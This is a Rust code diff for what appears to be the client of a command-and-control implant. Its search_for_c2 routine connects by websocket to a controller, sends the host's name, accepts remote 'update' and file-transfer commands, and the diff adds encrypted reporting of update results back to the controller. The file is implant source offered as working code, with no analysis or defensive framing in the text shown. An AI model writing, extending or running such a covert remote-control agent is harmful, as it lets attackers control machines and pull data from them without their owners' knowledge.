@@ -9,7 +9,7 @@ use futures_util::{
     SinkExt, StreamExt,
 };
 use gethostname::gethostname;
-use hybrid_crypto::{generate_private_key, HybridDecryption};
+use hybrid_crypto::{encrypt_data_combined, generate_private_key, HybridDecryption};
 use rsa::{
     pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
     Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
@@ -44,39 +44,24 @@ impl Connector {
             private_key: generate_private_key(),
         }
     }
-    pub async fn send_data(&mut self, data: String, response: Response) {
-        match &self
-            .write
+    pub async fn send_message(&mut self, message: String) {
+        self.write
             .as_mut()
             .unwrap()
-            .send(Message::Text(data.into()))
+            .send(Message::Text(message.into()))
             .await
-        {
-            Ok(_) => println!("Message sent successfully"),
-            Err(e) => {
-                println!("Connected to the server");
-                println!("Response HTTP code: {}", response.status());
-                println!("Response contains the following headers:");
-                for (header, _value) in response.headers() {
-                    println!("* {header}");
-                }
-                eprintln!("Failed to send message: {}", e)
-            }
-        }
+            .unwrap();
     }
 
     pub async fn search_for_c2(&mut self) {
         match connect_async(&self.address_server).await {
-            Ok((ws_stream, response)) => {
+            Ok((ws_stream, _)) => {
                 let (write, read) = ws_stream.split();
                 self.write = Some(write);
                 self.read = Some(read);
                 println!("Connected to the server");
-                self.send_data(
-                    format!("ping|{}", gethostname().into_string().unwrap()),
-                    response,
-                )
-                .await;
+                self.send_message(format!("ping|{}", gethostname().into_string().unwrap()))
+                    .await;
                 if let Some(message) = self.read.as_mut().unwrap().next().await {
                     //Debug
                     //println!("{}", message.unwrap());
@@ -101,9 +86,22 @@ impl Connector {
                     println!("got an update request");
                     let update = Update::new();
                     //send callback
+                    //TODO! make sending callback into separate method ot smth
                     match update.run(self).await {
-                        feature::Result::SUCCESFUL => {}
-                        feature::Result::FAILED => {}
+                        feature::Result::SUCCESFUL => {
+                            self.send_hybrid_encryption(
+                                self.public_key.clone().unwrap(),
+                                "SUCCESFUL".as_bytes().to_vec(),
+                            )
+                            .await;
+                        }
+                        feature::Result::FAILED => {
+                            self.send_hybrid_encryption(
+                                self.public_key.clone().unwrap(),
+                                "FAILED".as_bytes().to_vec(),
+                            )
+                            .await;
+                        }
                     }
                 }
                 "start_file_transfer" => {}
@@ -160,5 +158,14 @@ impl Connector {
             hybrid_decryption_arguments[2].clone(),
         );
         hybrid_decryption.decrypt(self.private_key.clone())
+    }
+    pub async fn send_hybrid_encryption(&mut self, public_key: RsaPublicKey, data_to_enc: Vec<u8>) {
+        let hybrid_encryption_result = encrypt_data_combined(public_key, data_to_enc);
+        self.send_message(hybrid_encryption_result.get_encrypted_key())
+            .await;
+        self.send_message(hybrid_encryption_result.get_nonce())
+            .await;
+        self.send_message(hybrid_encryption_result.get_encrypted_data())
+            .await;
     }
 }
